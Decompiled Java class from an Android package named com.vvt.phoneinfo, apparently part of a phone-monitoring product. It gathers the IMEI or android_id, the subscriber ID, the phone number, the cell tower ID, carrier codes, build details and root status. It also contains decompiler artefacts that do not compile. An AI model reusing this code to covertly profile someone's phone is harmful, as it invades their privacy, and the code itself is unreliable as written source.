package com.vvt.phoneinfo;

import android.content.ContentResolver;
import android.content.Context;
import android.os.Build;
import android.os.Build.VERSION;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import com.vvt.io.q;
import com.vvt.shell.ShellUtil;

public class b
  implements a
{
  private static final boolean a = com.vvt.ak.a.a;
  private int b;
  private int c;
  private int d;
  private int e;
  private String f;
  private String g;
  private String h;
  private String i;
  private String j;
  private String k;
  private String l;
  private int m;
  private int n;
  private String o;
  private String p;
  private PhoneType q;
  
  public b(Context paramContext, String paramString)
  {
    this.b = i1;
    this.c = i1;
    this.d = i1;
    this.e = i1;
    a(paramContext, paramString);
  }
  
  private String a(TelephonyManager paramTelephonyManager, Context paramContext)
  {
    Object localObject = paramTelephonyManager.getDeviceId();
    boolean bool = com.vvt.ag.b.a((String)localObject);
    if (bool)
    {
      localObject = com.vvt.aa.a.h();
      bool = com.vvt.ag.b.a((String)localObject);
      if (bool)
      {
        localObject = paramContext.getContentResolver();
        String str = "android_id";
        localObject = Settings.Secure.getString((ContentResolver)localObject, str);
      }
    }
    return (String)localObject;
  }
  
  private String a(TelephonyManager paramTelephonyManager, Context paramContext, String paramString)
  {
    String str = a(paramString);
    boolean bool = a;
    if (bool) {}
    bool = com.vvt.ag.b.a(str);
    if (bool)
    {
      str = a(paramTelephonyManager, paramContext);
      bool = a;
      if (bool) {}
      a(str, paramString);
      bool = a;
      if (!bool) {}
    }
    for (;;)
    {
      return str;
      bool = a;
      if (!bool) {}
    }
  }
  
  private String a(String paramString)
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = paramString;
    arrayOfObject[1] = "device_id";
    return (String)q.a(String.format("%s/%s", arrayOfObject));
  }
  
  private boolean a(String paramString1, String paramString2)
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = paramString2;
    arrayOfObject[1] = "device_id";
    String str = String.format("%s/%s", arrayOfObject);
    return q.a(paramString1, str);
  }
  
  private boolean b(String paramString)
  {
    return paramString.matches("^[0-9]+$");
  }
  
  public int a()
  {
    return this.c;
  }
  
  public void a(Context paramContext, String paramString)
  {
    int i1 = 2;
    int i2 = 3;
    Object localObject1 = (TelephonyManager)paramContext.getSystemService("phone");
    if (localObject1 == null)
    {
      localObject1 = new java/lang/NullPointerException;
      ((NullPointerException)localObject1).<init>("TelephonyManager can not be null");
      throw ((Throwable)localObject1);
    }
    int i3 = ((TelephonyManager)localObject1).getPhoneType();
    Object localObject2;
    Object localObject3;
    if ((i3 < 0) || (i3 > i1))
    {
      localObject2 = PhoneType.PHONE_TYPE_UNKNOWN;
      this.q = ((PhoneType)localObject2);
      localObject2 = a((TelephonyManager)localObject1, paramContext, paramString);
      this.f = ((String)localObject2);
      localObject2 = this.q;
      localObject3 = PhoneType.PHONE_TYPE_CDMA;
      if (localObject2 != localObject3) {
        break label447;
      }
      localObject2 = (CdmaCellLocation)((TelephonyManager)localObject1).getCellLocation();
      if (localObject2 != null)
      {
        i3 = ((CdmaCellLocation)localObject2).getBaseStationId();
        this.b = i3;
      }
      label127:
      localObject2 = ((TelephonyManager)localObject1).getSubscriberId();
      this.i = ((String)localObject2);
      localObject2 = ((TelephonyManager)localObject1).getNetworkOperator();
      if (localObject2 != null)
      {
        int i4 = ((String)localObject2).length();
        String str1;
        if (i4 > 0)
        {
          i4 = 0;
          localObject3 = ((String)localObject2).substring(0, i2);
          if (localObject3 != null)
          {
            str1 = ((String)localObject3).trim();
            String str2 = "";
            boolean bool2 = str1.equals(str2);
            if (!bool2)
            {
              bool2 = b((String)localObject3);
              if (bool2)
              {
                i4 = Integer.parseInt((String)localObject3);
                this.d = i4;
              }
            }
          }
        }
        i4 = ((String)localObject2).length();
        if (i4 > i2)
        {
          localObject2 = ((String)localObject2).substring(i2);
          if (localObject2 != null)
          {
            localObject3 = ((String)localObject2).trim();
            str1 = "";
            boolean bool1 = ((String)localObject3).equals(str1);
            if (!bool1)
            {
              bool1 = b((String)localObject2);
              if (bool1)
              {
                i3 = Integer.parseInt((String)localObject2);
                this.c = i3;
              }
            }
          }
        }
      }
      localObject2 = ((TelephonyManager)localObject1).getNetworkOperatorName();
      this.j = ((String)localObject2);
      i3 = Build.VERSION.SDK_INT;
      localObject2 = String.valueOf(i3);
      this.g = ((String)localObject2);
      localObject2 = Build.MODEL;
      this.h = ((String)localObject2);
      localObject1 = ((TelephonyManager)localObject1).getLine1Number();
      this.k = ((String)localObject1);
      localObject1 = Build.VERSION.RELEASE;
      this.l = ((String)localObject1);
      int i5 = Build.VERSION.SDK_INT;
      this.m = i5;
      localObject1 = Build.VERSION.INCREMENTAL;
      this.p = ((String)localObject1);
      localObject1 = Build.MANUFACTURER;
      this.o = ((String)localObject1);
      i6 = ShellUtil.c();
      if (i6 == 0) {
        break label496;
      }
    }
    label447:
    label496:
    for (int i6 = i1;; i6 = 1)
    {
      this.n = i6;
      return;
      localObject2 = PhoneType.forValue(i3);
      this.q = ((PhoneType)localObject2);
      break;
      localObject2 = this.q;
      localObject3 = PhoneType.PHONE_TYPE_GSM;
      if (localObject2 != localObject3) {
        break label127;
      }
      localObject2 = (GsmCellLocation)((TelephonyManager)localObject1).getCellLocation();
      if (localObject2 == null) {
        break label127;
      }
      i3 = ((GsmCellLocation)localObject2).getCid();
      this.b = i3;
      break label127;
    }
  }
  
  public int b()
  {
    return this.d;
  }
  
  public String c()
  {
    return this.j;
  }
  
  public String d()
  {
    return this.f;
  }
  
  public String e()
  {
    return this.i;
  }
  
  public String f()
  {
    return this.k;
  }
  
  public String g()
  {
    return this.h;
  }
  
  public String h()
  {
    return this.l;
  }
  
  public int i()
  {
    return this.m;
  }
  
  public int j()
  {
    return this.n;
  }
  
  public String k()
  {
    return this.o;
  }
  
  public String l()
  {
    return this.p;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoneinfo/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */